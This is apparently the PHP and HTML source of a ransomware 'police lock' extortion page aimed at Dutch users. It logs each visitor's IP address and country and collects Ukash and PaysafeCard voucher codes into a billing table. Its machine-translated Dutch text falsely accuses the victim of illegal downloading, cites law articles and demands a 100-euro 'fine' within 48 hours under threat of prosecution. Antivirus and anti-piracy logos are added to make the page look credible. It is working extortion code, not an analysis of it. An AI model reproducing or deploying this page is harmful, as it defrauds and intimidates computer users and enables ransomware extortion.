<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 733px;" id="Untitled-1-02"><span id="result_box" class="" lang="nl"><span class="hps">Alle activiteiten van</span> <span class="hps">deze computer</span> <span class="hps">is opgenomen.</span> <span class="hps">Als u</span> <span class="hps">webcam,</span> <span class="hps">werden</span> <span class="hps">video's</span> <span class="hps">en foto's</span> <span class="hps">bewaard</span> <span class="hps">voor identificatie</span> <span class="hps">webcam</span><span class="">.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="nl"><span class="hps">Uw IP</span><span class="atn">-</span><span class="">adres:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="nl"><span class="hps">Je kan</span> <span class="hps">duidelijk worden ge&iuml;dentificeerd</span> <span class="hps">door uw</span> <span class="hps">IP-adres en</span> <span class="hps">de bijbehorende</span> <span class="hps">hostnaam</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="nl"><span style="font-weight: bold;" class="hps">Illegaal gedownload</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">materiaal (</span><span style="font-weight: bold;">MP3's, films </span><span style="font-weight: bold;" class="hps">of software)</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">is</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">gelegen</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">op de computer</span><br>
<br>
 <span class="hps">Door het downloaden</span><span>,</span> <span class="hps">werden deze</span> <span class="hps">gereproduceerd,</span> <span class="hps">waardoor</span> <span class="hps">die een</span> <span class="hps">strafbaar feit</span> <span class="hps">op grond van artikel</span> <span class="hps">106 van</span> <span class="hps">Auteurswet.</span><br>
<br>
 <span class="hps">Het downloaden van</span> <span class="hps">auteursrechtelijk beschermd materiaal</span> <span class="hps">via het internet of</span> <span class="hps">het delen van muziek</span><span>-netwerken</span> <span class="hps">illegaal is en</span> <span class="hps">in overeenstemming is met</span><br>
 <span class="hps">Vak 106 van</span> <span class="hps">de Auteurswet</span> <span class="hps">onderworpen aan een boete</span> <span class="hps">of een gevangenisstraf van</span> <span class="hps">een boete van</span> <span class="hps">maximaal 3 jaar</span><br>
<br>
 <span class="hps">Verder bieden</span> <span class="hps">het bezit</span> <span class="hps">van illegaal</span> <span class="hps">gedownload materiaal</span> <span class="hps">is strafbaar gesteld in</span> <span class="hps">artikel 184</span> <span class="hps">paragraaf 3 van</span> <span class="hps">het Wetboek van Strafrecht</span> <span class="hps">en</span> <span class="hps">kan ook leiden tot</span> <span class="hps">de inbeslagname van</span> <span class="hps">de computer,</span> <span class="hps">waarmee de</span> <span class="hps">diles</span> <span class="hps">zijn gedownload</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="nl"><span class="hps">Volg de</span> <span class="hps">instructies</span> <span class="hps">aan de rechterkant</span></span>

<form name="ukash_form" method="get" action="NL.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="NL.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="nl"><span style="color: rgb(255, 0, 0);" class="hps">Let op</span><span style="color: rgb(255, 0, 0);">:</span> <span class="hps">Deze boete</span> <span class="hps">kan alleen</span> <span class="hps">worden betaald</span> <span class="hps">binnen 48 uur</span><span>,</span> <span class="hps">als je laat</span> <span class="hps">48 uur</span> <span class="hps">voorbij</span> <span class="hps">zonder betaling</span><span>,</span><br>
&nbsp; <span class="hps">de mogelijkheid tot</span> <span class="hps">het ontsluiten van</span> <span class="hps">uw computer</span> <span class="hps">verloopt.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">In dit geval</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">van een strafzaak</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">tegen u</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">zal automatisch</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">worden gestart</span><span style="font-weight: bold;" class="">.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="nl"><span class="hps">Hoe</span> <span class="hps">te ontgrendelen</span><span>?</span><br>
<br>
 <span class="hps">In overeenstemming met de</span> <span class="hps">wet</span> <span class="hps">"Op</span> <span class="hps">controle en bescherming van</span> <span class="hps">informatie" op</span> <span class="hps">02/01/2012</span> <span class="hps">Je moet</span> <span class="hps">een boete van</span> <span class="hps">100 euro</span> <span class="hps">te betalen.</span> <span class="hps">Voor het gemak van</span> <span class="hps">betalen van een boete</span> <span class="hps">aanbod om</span> <span class="hps">een veilige</span> <span class="hps">vorm van betaling</span> <span class="hps">te gebruiken</span> <span class="hps">door middel van vouchers</span> <span class="hps">Ukash</span> <span class="hps">/</span> <span class="hps">PaysafeCard</span><span>.</span> <span class="hps">U moet</span> <span class="hps">vouchers</span> <span class="hps">te kopen</span> <span class="hps">voor een bedrag van</span> <span class="hps">EUR</span> <span class="hps">100, na</span> <span class="hps">invullen van</span> <span class="hps">de juiste velden</span><span>,</span> <span class="hps">klik op "OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
